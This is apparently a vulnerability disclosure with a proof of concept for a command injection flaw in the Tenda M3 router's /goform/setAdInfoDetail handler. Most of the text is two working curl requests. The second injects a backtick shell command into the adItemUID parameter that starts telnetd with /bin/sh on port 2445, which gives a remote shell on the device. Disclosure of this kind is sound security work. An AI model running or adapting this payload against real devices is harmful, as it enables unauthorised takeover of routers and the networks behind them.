# Tenda M3 Command Injection

**Vender** ：Tenda

**Firmware version**:V1.0.0.12(4856)

**Exploit Author**: GD@hillstone

**Vendor Homepage**: https://www.tenda.com.cn/



## POC

An issue was discovered in Tenda M3 1.10 V1.0.0.12(4856) devices. An HTTP request parameter is used in command string construction within the handler function of the /goform/setAdInfoDetail route. This could lead to Command Injection via Shell Metacharacters.

![1](./1.jpg)



When we send packets, the router will be shell



```
curl -i -X POST http://192.168.10.1/goform/setWorkmode  -d workmode='master'   --cookie "user=admin"
```



```
curl -i -X POST http://192.168.10.1/goform/setAdInfoDetail -d adItemUID='aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa`telnetd -p 2445 -l /bin/sh`' -d weixinName='save'   -d action='edit' --cookie "user=admin;devUid=111:222;"
```



![2](./2.jpg)

![poc](./poc.jpg)

